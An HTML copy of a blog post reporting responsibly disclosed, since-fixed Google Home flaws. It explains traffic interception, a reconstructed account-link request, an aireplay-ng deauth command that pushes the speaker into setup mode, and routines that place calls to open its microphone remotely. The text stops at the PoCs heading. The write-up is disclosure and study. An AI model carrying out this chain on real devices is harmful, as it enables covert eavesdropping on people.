<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://downrightnifty.me/blog/2022/12/26/hacking-google-home.html">Original</a>
    <h1>Wiretapping Google smart speakers</h1>
    
    <div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <h2 id="summary">Summary</h2>

<p>I was <a href="#disclosure-timeline">recently</a> rewarded a total of $107,500 by Google for responsibly disclosing security issues in the Google Home smart speaker that allowed an attacker within wireless proximity to install a “backdoor” account on the device, enabling them to send commands to it remotely over the Internet, access its microphone feed, and make arbitrary HTTP requests within the victim’s LAN (which could potentially expose the Wi-Fi password or provide the attacker direct access to the victim’s other devices). These issues have since been fixed.</p>

<p>(Note: I tested everything on a Google Home Mini, but I assume that these attacks worked similarly on Google’s other smart speaker models.)</p>

<h2 id="contents">Contents</h2>
<ul>
  <li><a href="#investigation">Investigation</a>
    <ul>
      <li><a href="#setting-up-the-proxy">Setting up the proxy</a></li>
      <li><a href="#observing-the-link-process">Observing the link process</a></li>
      <li><a href="#python-re-implementation">Python re-implementation</a></li>
      <li><a href="#further-investigation">Further investigation</a></li>
    </ul>
  </li>
  <li><a href="#creating-malicious-routines">Creating malicious routines</a></li>
  <li><a href="#an-attack-scenario">An attack scenario</a></li>
  <li><a href="#a-cooler-attack-scenario">A cooler attack scenario</a></li>
  <li><a href="#what-else-can-we-do">What else can we do?</a></li>
  <li><a href="#pocs">PoCs</a>
    <ul>
      <li><a href="#poc-1-spy-on-victim">#1: Spy on victim</a></li>
      <li><a href="#poc-2-make-arbitrary-http-requests-on-victims-network">#2: Make arbitrary HTTP requests on victim’s network</a></li>
      <li><a href="#poc-3-readwrite-arbitrary-files-on-device">#3: Read/write arbitrary files on device</a></li>
    </ul>
  </li>
  <li><a href="#the-fixes">The fixes</a></li>
  <li><a href="#reflectionconclusions">Reflections/conclusions</a></li>
  <li><a href="#disclosure-timeline">Disclosure timeline</a></li>
  <li><a href="#prior-research">Prior research</a></li>
  <li>Footnotes
    <ul>
      <li><a href="#footnote-static-analysis-of-google-home-app">Static analysis of Google Home app</a></li>
      <li><a href="#footnote-deauth-attacks-on-google-home-mini">Deauth attacks on Google Home Mini</a></li>
    </ul>
  </li>
</ul>

<h2 id="investigation">Investigation</h2>

<p>I was messing with the Google Home and noticed how easy it was to add new users to the device from the Google Home app. I also noticed that linking your account to the device gives you a surprising amount of control over it.</p>

<p>Namely, the “routines” feature allows you to create shortcuts for running a series of other commands (e.g. a “good morning” routine that runs the commands “turn off the lights” and “tell me about the weather”). Through the Google Home app, routines can be configured to start automatically on your device on certain days at certain times. Effectively, routines allow anyone with an account linked to the device to send it commands remotely. In addition to remote control over the device, a linked account also allows you to install “actions” (tiny applications) onto it.</p>

<p>When I realized how much access a linked account gives you, I decided to investigate the linking process and determine how easy it would be to link an account from an attacker’s perspective.</p>

<p>So… how would one go about doing that? There are a bunch of different routes to explore when reverse engineering an IoT device, including (but not limited to):</p>

<ol>
  <li>Obtaining the device’s firmware by dumping it or downloading it from the vendor’s website</li>
  <li><a href="#footnote-static-analysis-of-google-home-app">Static analysis</a> of the app that interfaces with the device (in this case, the “Google Home” Android app), e.g. using <a href="https://ibotpeaches.github.io/Apktool/">Apktool</a> or <a href="https://github.com/skylot/jadx">JADX</a> to decompile it</li>
  <li>Dynamic analysis of the app during runtime, e.g. using <a href="https://frida.re/docs/examples/android/">Frida</a> to hook Java methods and print info about internal state</li>
  <li>Intercepting the communications between the app and the device (or between the app/device and the vendor’s servers) using a “man-in-the-middle” (MITM) attack</li>
</ol>

<p>Obtaining firmware is particularly difficult in the case of Google Home because there are no debugging/flashing pins on the device’s PCB so the only way to read the flash is to desolder the NAND chip. Google also does not publicly provide firmware image downloads. As shown at DEFCON though, it <a href="#prior-research">is possible</a>.</p>

<p>However, in general, when reverse engineering things, I like to start with a MITM attack if possible, since it’s usually the most straightforward path to gaining some insight into how the thing works. Typically IoT devices use standard protocols like HTTP or Bluetooth for communicating with their corresponding apps. HTTP in particular can be easily snooped using tools like <a href="https://mitmproxy.org/">mitmproxy</a>. I love mitmproxy because it’s FOSS, has a nice terminal-based UI, and provides an easy-to-use Python API.</p>

<p>Since the Google Home doesn’t have its own display or user interface, most of its settings are controlled through the Google Home app. A little Googling <a href="https://github.com/rithvikvibhu/GHLocalApi">revealed</a> that some people had already begun to document the local HTTP API that the device exposes for the Google Home app to use. Google Cast devices (including Google Homes and Chromecasts) advertise themselves on the LAN using mDNS, so we can use <code>dns-sd</code> to discover them:</p>

<div><div><pre><code>$ dns-sd -B _googlecast._tcp
Browsing for _googlecast._tcp
DATE: ---Fri 05 Aug 2022---
15:30:15.526  ...STARTING...
Timestamp     A/R    Flags  if Domain               Service Type         Instance Name
15:30:15.527  Add        3   6 local.               _googlecast._tcp.    Chromecast-997113e3cc9fce38d8284cee20de6435
15:30:15.527  Add        3   6 local.               _googlecast._tcp.    Google-Nest-Hub-d5d194c9b7a0255571045cbf615f7ffb
15:30:15.527  Add        3   6 local.               _googlecast._tcp.    Google-Home-Mini-f09088353752a2e56bddbb2a27ec377a
</code></pre></div></div>

<p>We can use <code>nmap</code> to find the port that the local HTTP API is running on:</p>

<div><div><pre><code>$ nmap 192.168.86.29
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-05 15:41
Nmap scan report for google-home-mini.lan (192.168.86.29)
Host is up (0.0075s latency).
Not shown: 995 closed ports
PORT      STATE SERVICE
8008/tcp  open  http
8009/tcp  open  ajp13
8443/tcp  open  https-alt
9000/tcp  open  cslistener
10001/tcp open  scp-config
</code></pre></div></div>

<p>We see HTTP servers on port 8008 and 8443. According to the unofficial documentation I linked above, 8008 is deprecated and only 8443 works now. (The other ports are for Chromecast functionality, and some unofficial documentation for those is available elsewhere on the Internet.) Let’s try issuing a request:</p>

<div><div><pre><code>$ curl -s --insecure https://192.168.86.29:8443/setup/eureka_info?params=settings
{&#34;settings&#34;:{&#34;closed_caption&#34;:{},&#34;control_notifications&#34;:1,&#34;country_code&#34;:&#34;US&#34;,&#34;locale&#34;:&#34;en-US&#34;,&#34;network_standby&#34;:0,&#34;system_sound_effects&#34;:true,&#34;time_format&#34;:1,&#34;timezone&#34;:&#34;America/Chicago&#34;,&#34;wake_on_cast&#34;:1}}</code></pre></div></div>

<p>(We use <code>--insecure</code> because the device sends a self-signed certificate, which the Google Home app is configured to trust, but my computer is not.)</p>

<p>Ok, we got the device’s settings. However, the docs say that most API endpoints require a <code>cast-local-authorization-token</code>. Let’s try something more interesting, rebooting the device:</p>

<div><div><pre><code>$ curl -i --insecure -X POST -H &#39;Content-Type: application/json&#39; -d &#39;{&#34;params&#34;:&#34;now&#34;}&#39; https://192.168.86.29:8443/setup/reboot
HTTP/1.1 401 Unauthorized
Access-Control-Allow-Headers:Content-Type
Cache-Control:no-cache
Content-Length:0
</code></pre></div></div>

<p>Indeed, it’s rejecting the request because we’re not authorized. So how do we get the token? Well, the docs say that you can either extract it from the Google Home app’s private app data directory (if your phone is rooted), or you can use a script that takes your Google username and password as input, calls the API that the Google Home app internally uses to get the token, and returns the token. Both of these methods require that you have an account that’s already been linked to the device, though, and I wanted to figure out how the linking happens in the first place. Presumably, this token is being used to prevent an attacker (or malicious app) on the LAN from accessing the device. Therefore, it surely takes more than just basic LAN access to link an account and get the token, right…? I searched the docs but there was no mention of account linking. So I proceeded to investigate the matter myself.</p>

<h3 id="setting-up-the-proxy">Setting up the proxy</h3>
<p>Intercepting unencrypted HTTP traffic with mitmproxy on Android is as simple as starting the proxy server then configuring your phone (or just the target app) to route all of its traffic through the proxy. However, the unofficial local API documentation said that Google had recently started using HTTPS. Also, I wanted to be able to intercept not only the traffic between the app and the Google Home device, but also between the app and Google’s servers (which is definitely HTTPS). I thought that since the linking process involved Google accounts, parts of the process might happen on the Google server, rather than on the device.</p>

<p>Intercepting HTTPS traffic on Android is a little trickier, but usually not terribly difficult. In addition to configuring the proxy settings, you also need to make the app trust mitmproxy’s root CA certificate. You can install new CAs through Android Settings, but annoyingly as of Android 7 apps using the system-provided networking APIs will <a href="https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html">no longer automatically trust</a> user-added CAs. If you have a rooted Android phone, you can modify the system CA store directly (located at <code>/system/etc/security/cacerts</code>). Alternatively, you could <a href="https://www.netspi.com/blog/technical/mobile-application-penetration-testing/four-ways-bypass-android-ssl-verification-certificate-pinning/">manually patch</a> the individual app. However, sometimes even that isn’t enough as some apps employ “SSL pinning” to ensure that the certificate used for SSL matches the one they were expecting. If the app uses the system-provided pinning APIs (<code>javax.net.ssl</code>) or uses a popular HTTP library (e.g. OkHttp), it’s not hard to bypass; just <a href="https://github.com/httptoolkit/frida-android-unpinning/blob/main/frida-script.js">hook the relevant methods with Frida</a> or <a href="https://github.com/Fuzion24/JustTrustMe">Xposed</a>. While Xposed and the full version of Frida both require root, <a href="https://koz.io/using-frida-on-android-without-root/">Frida Gadget</a> can be used without root. If the app is using a custom pinning mechanism, you’ll have to reverse engineer it and manually patch it out.</p>

<p>Patching and repacking the Google Home app isn’t an option because it uses Google Play Services OAuth APIs (which means the APK needs to be signed by Google or it’ll crash), so root access is necessary to intercept its traffic. Since I didn’t want to root my primary phone, and emulators tend to be clunky, I decided to use an old spare phone I had lying around. I rooted it using <a href="https://github.com/topjohnwu/Magisk">Magisk</a> and modified the system CA store to include mitmproxy’s CA, but this wasn’t sufficient as the Google Home app appeared to be utilizing SSL pinning. To bypass the pinning, I used a Frida script I found on GitHub.</p>

<p>I could now see all of the encrypted traffic showing up in mitmproxy:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/mitmproxy_traffic.png" alt=""/></p>

<p>Even the traffic between the app and device was being captured. Cool!</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/eureka_info.png" alt=""/></p>

<h3 id="observing-the-link-process">Observing the link process</h3>
<p>Alright, so let’s observe what happens when a new user links their account to the device. I already had my primary Google account linked, so I created a new account as the “attacker”. When I opened the Google Home app and signed in under the new account (making sure I was connected to the same Wi-Fi network as the device), the device showed up under “Other devices”, and when I tapped on it, I was greeted with this screen:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/link_button.png" height="512px" width="288px"/></p>

<p>I pressed the button and it prompted me to install the Google Search app to continue. I guess the Voice Match setup is done through that app instead. But as an attacker I don’t care about adding my voice to the device; I only want to link my account. So is it possible to link an account <em>without</em> Voice Match? I thought that it must be, since the initial device setup was done entirely within the Home app, and I wasn’t required to enable Voice Match on my primary account. I was about to perform a factory reset and observe the initial account link, but then I realized something.</p>

<p>Much of the internal architecture of Google Home is shared with Chromecast devices. According to a <a href="#prior-research">DEFCON talk</a>, Google Home devices use the same operating system as Chromecasts (a version of Linux). The local API seems to be the similar, too. In fact, the Home app’s package name ends with <code>chromecast.app</code>, and it used to just be called “<a href="https://www.apkmirror.com/apk/google-inc/chromecast/">Chromecast</a>”. Back then, its only function was to set up Chromecast devices. Now it’s responsible for setting up and managing not just Chromecasts, but <em>all</em> of Google’s smart home devices.</p>

<p>Anyway, why not just try observing how the Chromecast link process works, then try to replicate it for use with the Google Home? It’s bound to be simpler, because Chromecasts don’t support Voice Match (nor the Google Assistant, for that matter). Luckily, I also had a few Chromecasts lying around. I plugged in one and found it within the Home app:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/chromecast_link_prompt.png" height="512px" width="288px"/></p>

<p>All I had to do was tap the “Enable voice control and more” banner and confirm, and then my account was linked! Ok, let’s see what happened on the network side:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/link_request.png" alt=""/></p>

<p>We see a POST request to a <code>/deviceuserlinksbatch</code> endpoint on <code>clients3.google.com</code>:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/link_req_1.png" alt=""/></p>

<p>It’s a binary payload, but we can immediately see that it contains some device details (e.g. the device’s name, “Office TV”). We see that the <code>content-type</code> is <code>application/protobuf</code>. <a href="https://developers.google.com/protocol-buffers">Protocol Buffers</a> is Google’s binary data serialization format. Like JSON, data is stored in pairs of keys and values. The client and server exchanging protobuf data both have a copy of the <code>.proto</code> file, which defines the field names and data types (e.g. <code>uint32</code>, <code>bool</code>, <code>string</code>, etc). During the encoding process, this data is stripped out, and all that remains are the field numbers and <a href="https://developers.google.com/protocol-buffers/docs/encoding#structure">wire types</a>. Fortunately, the wire types translate pretty directly back to the original data types (there are usually only a few possibilities as to what the original data type could have been based on the wire type). Google provides a command-line tool called <a href="https://github.com/protocolbuffers/protobuf/releases"><code>protoc</code></a> that allows us to encode and decode protobuf data. The <code>--decode_raw</code> option tells <code>protoc</code> to decode without the <code>.proto</code> file by guessing what the data types are. This raw decoding is usually enough to understand the data structure, but if it doesn’t look right, you could create your own <code>.proto</code> with your data type guesses, try to decode, and if it still doesn’t make sense, keep adjusting the <code>.proto</code> until it does.</p>

<p>In our case, <code>--decode_raw</code> produces a perfectly readable output:</p>

<div><div><pre><code>$ protoc --decode_raw &lt; deviceuserlinksbatch
1 {
  1: &#34;590C[...]&#34;
  2: &#34;MIIDojCCAoqgAwIBAgIEVcQZjzANBgkqhkiG9w0BAQUFADB5MQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEWMBQGA1UEBwwNTW91bnRhaW4gVmlldzETMBEGA1UECgwKR29vZ2xlIEluYzENMAsGA1UECwwEQ2FzdDEZMBcGA1UEAwwQQ2hyb21lY2FzdCBJQ0EgMzAeFw0xNTA4MDcwMjM1NTlaFw0zNTA4MDIwMjM1NTlaMHwxEzARBgNVBAoMCkdvb2dsZSBJbmMxDTALBgNVBAsMBENhc3QxFjAUBgNVBAcMDU1vdW50YWluIFZpZXcxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRwwGgYDVQQDDBMzVzM3OTkgRkE4RkNBMzJDRjBEMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAleog/oEXK6PKyGHDIYcDwT2Xl8GLOFuhxQh/K+dTahxex9+4mLAXx5v2s75Iwv9jcXEpD5NTvjNXx20B0/rfpYORHbcm3UEwFWGnP5uvKIyLar+rC7Az5ZPzPXMx7xX6Br68/gOXMGJd17OG/m0rduBZNjmasBb7+Zu8jS38cv+N3S7yTobJbagrHxIufa7gX+rO2f3/jF2EutgcA4lIm5r/2J34fkYTMXnxElJCUv/b1COuk0FZTei4mooJ+TvcQE2ljgHOSvzGnZuT+QWch8TyRjIjKuIK4dB1UIcSvmQoq9PTbfzWCTcW1fREdPtnta6pyWIzmoJ9+3AhVnWAhwIDAQABoy8wLTAJBgNVHRMEAjAAMAsGA1UdDwQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAjANBgkqhkiG9w0BAQUFAAOCAQEAv11SILN9BfcUthEFq/0NJYnNIFoza21T1BR9qYymFKtUGOplFav00drHziTzUUCNUzbLGnR/yKXxXYlgUOlscEIHxN0+11tvWslHQk7Xgz2RUerBXy9l+vSwp87F8YVECny8lMFZi0T6hHUvtuM6O9qovQKS6ORx3GmZKlNOsNspPnF8IVpN+KtIiopL6vf84iCpbx+dQoOfUOZsbZ+XSxwT34yeNFXqdAIFwP1maMmPZZYnQrDYyUdyowYzk48fDG2QDhFf7dLjtCngcQ83MWWU5nx9On67hnj2VeFGKWsner4cwjs0+iVafUGiWD0tZejVXHSrR7TBouqOf9eG6Q==&#34;
  6: &#34;Office TV&#34;
  7: &#34;b&#34;
  8: 0
  9 {
    1: 1
    2: 0
  }
  10: 2
  12: 0
}</code></pre></div></div>

<p>Looks like the link request payload mainly consists of three things: device name, certificate, and “cloud ID”. I quickly recognized these values from the earlier <code>/setup/eureka_info</code> local API requests. So it appears that the link process is:</p>

<ol>
  <li>Get the device’s info through its local API</li>
  <li>Send a link request to the Google server along with this info</li>
</ol>

<p>I wanted to use mitmproxy to re-issue a modified version of the request, replacing my Chromecast’s info with the Google Home’s info. I would eventually want to create a <code>.proto</code> file so I could use <code>protoc --encode</code> to create link requests from scratch, but at that point I just wanted to quickly test to see if it would work. I figured I could replace any strings in the binary payload without causing any problems as long as they were the same length. The cloud ID and cert were the same lengths, but the name (“Office speaker”) was not, so I renamed the device in the Home app to make it that way. Then I issued the modified request, and it appeared to work. The Google Home’s settings were unlocked in the Home app. Behind the scenes, I saw in mitmproxy that the device’s local auth token was being sent along with local API requests.</p>

<h3 id="python-re-implementation">Python re-implementation</h3>
<p>The next thing I wanted to do is re-implement the link process with a Python script so I didn’t have to bother with the Home app any more.</p>

<p>To get the required device info, we just need to issue a request like:</p>

<div><div><pre><code>GET https://[Google Home IP]:8443/setup/eureka_info?params=name,device_info,sign
</code></pre></div></div>

<p>Re-implementing the actual link request was a tad harder. First I examined <a href="https://gist.github.com/rithvikvibhu/952f83ea656c6782fbd0f1645059055d/aa63baed7e75536585f35f523e93f57562b0eb43">the script</a> mentioned by the unofficial local API docs that calls Google’s cloud APIs. It uses a library called <a href="https://github.com/simon-weber/gpsoauth">gpsoauth</a> which implements Android’s Google login flow in Python. Basically, it turns your Google username and password into OAuth tokens, which can be used to call undocumented Google APIs. It’s being used by some unofficial Python clients for Google services, like <a href="https://github.com/kiwiz/gkeepapi">gkeepapi</a> for Google Keep.</p>

<p>I used mitmproxy and gpsoauth to figure out and re-implement the link request. It looks like this:</p>

<div><div><pre><code>POST https://clients3.google.com/cast/orchestration/deviceuserlinksbatch?rt=b

Authorization: Bearer [token from gpsoauth]
[...some uninteresting headers added by the Home app...]
Content-Type: application/protobuf

[device info protobuf payload, described earlier]
</code></pre></div></div>

<p>To create the protobuf payload, I made a simple <code>.proto</code> file for the link request so I could use <code>protoc --encode</code>. I gave the fields I knew descriptive names (e.g. <code>device_name</code>), and the unknown fields generic names:</p>

<div><div><pre><code>syntax = &#34;proto2&#34;;

message LinkDevicePayload {
    message Payload {
        message Data {
            required uint32 i1 = 1;
            required uint32 i2 = 2;
        }
        required string device_id = 1;
        required string device_cert = 2;
        required string device_name = 6;
        required string s7 = 7;
        required uint32 i8 = 8;
        required Data d = 9;
        required uint32 i10 = 10;
        required uint32 i12 = 12;
    }
    required Payload p = 1;
}
</code></pre></div></div>

<p>As a basic smoke test, I used this <code>.proto</code> to encode a message with the same values as the message I captured from the Home app, and made sure that the binary output was the same.</p>

<p>Putting it all together, I had a Python script that takes your Google credentials and an IP address as input and uses them to link your account to the Google Home device at the provided IP.</p>

<h3 id="further-investigation">Further investigation</h3>
<p>Now that I had my Python script, it was time to think from the perspective of an attacker. Just how much control over the device does a linked account gives you, and what are some potential attack scenarios? I first targeted the routines feature, which allows you to execute voice commands on the device remotely. Doing some more research into previous attacks on Google Home devices, I encountered the <a href="#prior-research">“Light Commands” attack</a>, which provided some inspiration for coming up with commands that an attacker might use:</p>

<blockquote>
  <ul>
    <li>Control smart home switches</li>
    <li>Open smart garage doors</li>
    <li>Make online purchases</li>
    <li>Remotely unlock and start certain vehicles</li>
    <li>Open smart locks by stealthily brute forcing the user’s PIN number</li>
  </ul>
</blockquote>

<p>I wanted to go further though and come up with an attack that would work on all Google Home devices, regardless of how many other smart devices that the user has. I was trying to come up with a way to use a voice command to activate the microphone and exfiltrate the data. Perhaps I could use voice commands to load an application onto the device which opens the microphone? Looking at the <a href="https://developers.google.com/assistant/conversational/overview">“conversational actions” docs</a>, it seemed possible to create an app for the Google Home and then invoke it on a linked device using the command “talk to my test app”. But these “apps” can’t really do much. They don’t have access to the raw audio from the microphone; they only get a transcription of what the user says. They don’t even run on the device itself. Rather, the Google servers talk to your app via webhooks on the device’s behalf. The “smart home actions” seemed more interesting, but that’s something I explored later.</p>

<p>All of a sudden it hit me: these devices support a “<a href="https://support.google.com/googlenest/answer/9849261">call [phone number]</a>” command. You could effectively use this command to tell the device to start sending data from its microphone feed to some arbitrary phone number.</p>

<h2 id="creating-malicious-routines">Creating malicious routines</h2>
<p>The interface for creating a routine within the Google Home app looks like this:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/routines_ui.png" height="512px" width="288px"/></p>

<p>With the help of mitmproxy, I learned that this is actually just a WebView that embeds the website <code>https://assistant.google.com/settings/routines</code>, which loads fine in a normal web browser (as long as you’re logged in to a Google account). This made reverse engineering it a little easier.</p>

<p>I created a routine to execute the command “call [my phone number]” on Wednesdays at 8:26 PM (it was currently a Wednesday, at 8:25 PM). For routines that run automatically at certain times, you need to specify a “device for audio” (a device to run the routine on). You can choose from a list of devices linked to your account:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/routine.png" height="575px" width="504px"/></p>

<p>A minute later, the routine executed on my Google Home, and it called my phone. I picked up the phone and listened to myself talking through the Google Home’s microphone. Pretty cool!</p>

<p>(Later through inspecting network requests, I found that you can specify not only the hour and minute to activate the routine at, but also the precise second, which meant I only had to wait a few seconds for my routines to activate, rather than about a minute.)</p>

<h2 id="an-attack-scenario">An attack scenario</h2>
<p>I had a feeling that Google didn’t intend to make it so easy to access the microphone feed on the Google Home remotely. I quickly thought of an attack scenario:</p>

<blockquote>
  <p>Attacker wishes to spy on victim.</p>

  <ol>
    <li>Victim installs attacker’s malicious Android app.</li>
    <li>App detects a Google Home on the network via mDNS.</li>
    <li>App uses the basic LAN access it’s automatically granted to silently issue the two HTTP requests necessary to link the attacker’s account to the victim’s device (no special permissions necessary).</li>
  </ol>

  <p>Attacker can now spy on the victim through their Google Home.</p>
</blockquote>

<p>This still requires social engineering and user interaction, though, which isn’t ideal from an attacker’s perspective. Can we make it cooler?</p>

<p>From a more abstract point of view, the combined device information (name, cert, and cloud ID) basically acts as a “password” that grants remote control of the device. The device exposes this password over the LAN through the local API. Are there other ways for an attacker to access the local API?</p>

<p>In 2019, “<a href="#prior-research">CastHack</a>” made the news, as it was discovered that thousands of Google Cast devices (including Google Homes) were exposed to the public Internet. At first it was believed that the issue was these devices’ use of UPnP to automatically open ports on the router related to casting (8008, 8009, and 8443). However, it appears that UPnP is only used by Cast devices for local discovery, not for port forwarding, so the likely cause was a widespread networking misconfiguration (that might be related to UPnP somehow).</p>

<p>The people behind CastHack didn’t realize the true level of access that the local API provides (if combined with cloud APIs):</p>

<blockquote>
  <p>What can hackers do with this?</p>

  <p>Remotely play media on your device, rename your device, factory reset or reboot the device, force it to forget all wifi networks, force it to pair to a new bluetooth speaker/wifi point, and so on.</p>
</blockquote>

<p>(These are all local API endpoints, documented by the community already. This was also before the local API started requiring an auth token.)</p>

<blockquote>
  <p>What CAN’T hackers do with this?</p>

  <p>Assuming the Chromecast/Google Home is the only problem you have, hackers CANNOT access other devices on the network or sniff information besides WIFI points and Bluetooth devices. They also don’t have access to your personal Google account, nor the Google Home’s microphone.</p>
</blockquote>

<p>There are services like Shodan that allow you to scan the Internet for open ports and vulnerable devices. I was able to find hundreds of Cast devices with port 8443 (local API) publicly exposed using some simple search queries. I didn’t pursue this for very long though, because ultimately bad router configuration is not something Google can fix.</p>

<p>While I was reading about CastHack, however, I encountered articles all the way back from 2014 (!) about the “<a href="#prior-research">RickMote</a>”, a PoC contraption developed by Dan Petro, security researcher at Bishop Fox, that hijacks nearby Chromecasts and plays “Never Gonna Give You Up” on YouTube. Petro discovered that, when a Chromecast loses its Internet connection, it enters a “setup mode” and creates its own open Wi-Fi network. The intended purpose is to allow the device’s owner to connect to this network from the Google Home app and reset the Wi-Fi settings (in the event that the password was changed, for example). The “RickMote” takes advantage of this behavior.</p>

<p>It turns out that it’s usually really easy to force nearby devices to disconnect from their Wi-Fi network: just <a href="https://mjg59.dreamwidth.org/53968.html">send a bunch of “deauth” packets</a> to the target device. WPA2 provides strong encryption for data frames (as long as you choose a good password). However, “management” frames, like deauthentication frames (which tell clients to disconnect) are not encrypted. <a href="https://en.wikipedia.org/wiki/IEEE_802.11w">802.11w</a> and WPA3 support encrypted management frames, but the Google Home Mini <a href="#footnote-deauth-attacks-on-google-home-mini">doesn’t support either of these</a>. (Even if it did, the router would need to support them as well for it to work, and this is rare among consumer home routers at this time due to potential compatibility issues. And finally, even if both the device and router supported them, there are still other methods for an attacker to disrupt your Wi-Fi. Basic channel jamming is always an option, though this requires specialized, illegal hardware. Ultimately, Wi-Fi is a poor choice for devices that must be connected to the Internet at all times.)</p>

<p>I wanted to check if this “setup mode” behavior was still in use on the Google Home. I installed <code>aircrack-ng</code> and used the following command to launch a deauth attack:</p>

<div><div><pre><code>aireplay-ng --deauth 0 -a [router BSSID] -c [device MAC address] [interface]
</code></pre></div></div>

<p>My Google Home <em>immediately</em> disconnected from the network and then made its own:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/wifi_list.png" width="288px" height="156px"/></p>

<p>I connected to the network and used <code>netstat</code> to get the router’s IP (the router being the Google Home), and saw that it assigned itself the IP <code>192.168.255.249</code>. I issued a local API request to see if it would work:</p>

<div><div><pre><code>$ curl -s --insecure https://192.168.255.249:8443/setup/eureka_info?params=name,device_info,sign | python3 -m json.tool
{
    &#34;device_info&#34;: {
        [...]
        &#34;cloud_device_id&#34;: &#34;590C[...]&#34;,
        [...]
    },
    &#34;name&#34;: &#34;Office speaker&#34;,
    &#34;sign&#34;: {
        &#34;certificate&#34;: &#34;-----BEGIN CERTIFICATE-----\nMIID[...]\n-----END CERTIFICATE-----\n&#34;,
        [...]
    }
}
</code></pre></div></div>

<p>I was shocked to see that it did! With this information, it’s possible to link an account to the device and remotely control it.</p>

<h2 id="a-cooler-attack-scenario">A cooler attack scenario</h2>
<blockquote>
  <p>Attacker wishes to spy on victim. Attacker can get within wireless proximity of the Google Home (but does NOT have the victim’s Wi-Fi password).</p>

  <ol>
    <li>Attacker discovers victim’s Google Home by listening for MAC addresses with prefixes associated with Google Inc. (e.g. <code>E4:F0:42</code>).</li>
    <li>Attacker sends deauth packets to disconnect the device from its network and make it enter setup mode.</li>
    <li>Attacker connects to the device’s setup network and requests its device info.</li>
    <li>Attacker connects to the Internet and uses the obtained device info to link their account to the victim’s device.</li>
  </ol>

  <p>Attacker can now spy on the victim through their Google Home over the Internet (no need to be within proximity of the device anymore).</p>
</blockquote>

<h2 id="what-else-can-we-do">What else can we do?</h2>
<p>Clearly a linked account gives a tremendous amount of control over the device. I wanted to see if there was anything else an attacker could do. We were now accounting for attackers that aren’t already on the victim’s network. Would it be possible to interact with (and potentially attack) the victim’s other devices through the compromised Google Home? We already know that with a linked account you can:</p>

<ul>
  <li>Get the local auth token and change device settings through the local API</li>
  <li>Execute commands on the device remotely through “routines”</li>
  <li>Install “actions”, which are like sandboxed applications</li>
</ul>

<p>Earlier I looked into “<a href="https://developers.google.com/assistant/conversational/overview">conversational actions</a>” and determined that these are too sandboxed to be useful as an attacker. But there is another type of action: “<a href="https://developers.google.com/assistant/smarthome/overview">smart home actions</a>”. Device manufacturers (e.g. Philips) can use these to add support for their devices to the Google Home platform (e.g. when the user says “turn on the lights”, their Philips Hue light bulbs will receive a “turn on” command).</p>

<p>One thing I found particularly interesting while reading the documentation was the “<a href="https://developers.google.com/assistant/smarthome/concepts/local">Local Home SDK</a>”. Smart home actions used to only run through the Internet (like conversational actions), but Google had recently (April 2020) <a href="https://developers.googleblog.com/2020/04/local-home-sdk-ready-for-actions.html">introduced support</a> for running these locally, improving latency.</p>

<blockquote>
  <p>The SDK lets you write a local fulfillment app, using TypeScript or JavaScript, that contains your smart home business logic. Google Home or Google Nest devices can load and run your app on-device. Your app communicates directly with your existing smart devices over Wi-Fi on a local area network (LAN) to fulfill user commands, over existing protocols.</p>
</blockquote>

<p>Sounded promising. I looked into how it works though and it turns out that these local home apps don’t have direct LAN access. You can’t just connect to any IP you want; rather, you need to specify a “scan configuration” using mDNS, UPnP or UDP broadcast. The Google Home scans the network on your behalf, and if any matching devices are found, it will return a JavaScript object that allows your app to interact with the device over TCP/UDP/HTTP.</p>

<p>Is there any way around this? I noticed that the docs <a href="https://developers.google.com/assistant/smarthome/develop/local#debugging_from_chrome">said something</a> about debugging using Chrome DevTools. It turns out that when a local home app is running in testing mode (deployed to the developer’s own account), the Google Home opens port 9222 for the <a href="https://chromedevtools.github.io/devtools-protocol/">Chrome DevTools Protocol</a> (CDP). CDP access provides complete control over the Chrome instance. For example, you can open or close tabs, and intercept network requests. That got me thinking, maybe I could provide a scan configuration that instructs the Google Home to scan for <em>itself</em>, so I would be able to connect to CDP, take control of the Chrome instance running on the device, and use it to make arbitrary requests within the LAN.</p>

<p>I created a local home app using my linked account and set up the scan config to search for the <code>_googlecast._tcp.local</code> mDNS service. I rebooted the device, and the app loaded automatically. It quickly found itself and I was able to issue HTTP requests to <code>localhost</code>!</p>

<p>CDP uses WebSockets, which can be accessed through the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API">standard JS API</a>. The same-origin policy doesn’t apply to WebSockets, so we can easily initiate a WebSocket to <code>localhost</code> from our local home app (hosted on some public website) without any problems, as long as we have the correct URL. Because CDP access could lead to trivial RCE on the desktop version of Chrome, the WebSocket address is randomly generated each time debugging is enabled, to prevent random websites from connecting. The address can be retrieved through a GET request to <code>http://[CDP host]:9222/json</code>. This is normally protected by the same-origin policy, so we can’t just use an XHR request, but since we have full access to <code>localhost</code> through the Local Home SDK, we can use that to make the request. Once we have the address, we can use the JS <code>WebSocket()</code> constructor to connect.</p>

<p>Through CDP, we can send arbitrary HTTP requests within the victim’s LAN, which opens up the victim’s other devices for attack. As I describe later, I also found a way to read and write arbitrary files on the device using CDP.</p>

<h2 id="pocs">PoCs</h2>
